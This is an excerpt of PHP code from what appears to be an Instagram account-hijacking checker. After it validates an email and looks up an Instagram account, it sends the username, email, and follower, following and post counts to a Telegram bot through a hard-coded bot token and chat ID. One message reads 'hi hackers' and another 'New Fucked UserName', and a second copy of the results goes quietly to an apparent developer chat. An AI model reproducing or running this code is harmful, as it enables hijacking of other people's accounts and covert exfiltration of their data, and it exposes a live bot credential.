                  ...
                  if(checkMail($mail)){
                        ...
                        if ($inInsta !== false) {
                            // if($config['filter'] <= $follow){
                                ...
                                $brok = '5213303370:AAE8SNa1DVzN1bC1M1sOVvF1hWpvjMb1o8k';
                                $from_id = '1150883146';
                                $follow = $info['f'];
                                $following = $info['ff'];
                                $media = $info['m']; 
 file_get_contents("https://api.telegram.org/bot$brok/sendMessage?chat_id=$from_id&text=Hi silver New Fucked 
UserName ➠ $usern
Email ➠ $mail
Followers ➠ $follow
Following ➠ $following
Post ➠ $media ");
                                ...
                                bot('sendMessage', [ 'disable_web_page_preview' => true, 'chat_id' => $id, 'text' => "hi hackers \n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \n username  : [$usern](instagram.com/$usern)\n email : [$mail]\n followers : $follow\n following : $following\n post : $media\n.. time : " . date('Y/n/j g:i') . "\n" . "- - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\ndev :- [@iiwiw]\nch :- [@Professional_school]",
